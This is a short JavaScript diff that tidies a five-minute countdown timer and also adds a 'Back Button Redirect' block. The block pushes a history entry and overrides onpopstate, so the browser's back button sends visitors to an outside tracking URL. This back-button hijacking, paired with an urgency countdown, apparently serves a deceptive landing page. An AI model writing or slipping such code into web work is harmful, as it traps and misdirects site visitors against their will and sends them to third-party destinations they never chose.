@@ -1,13 +1,21 @@
-let time = 300; // 5 minutes
-
+// ===== Countdown Timer (5 minutes) =====
+let time = 300;
 const timerEl = document.getElementById("timer");
 
-setInterval(() => {
-  let minutes = Math.floor(time / 60);
-  let seconds = time % 60;
+if (timerEl) {
+  setInterval(() => {
+    let minutes = Math.floor(time / 60);
+    let seconds = time % 60;
+    seconds = seconds < 10 ? "0" + seconds : seconds;
+    timerEl.innerHTML = `${minutes}:${seconds}`;
+    if (time > 0) time--;
+  }, 1000);
+}
 
-  seconds = seconds < 10 ? "0" + seconds : seconds;
-  timerEl.innerHTML = `${minutes}:${seconds}`;
+// ===== Back Button Redirect =====
+history.pushState(null, null, location.href);
 
-  if (time > 0) time--;
-}, 1000);
+window.onpopstate = function () {
+  window.location.href =
+    "https://www.af9m8trk.com/U8Y11VZ6/SUM122L1/?s1=joy1";
+};
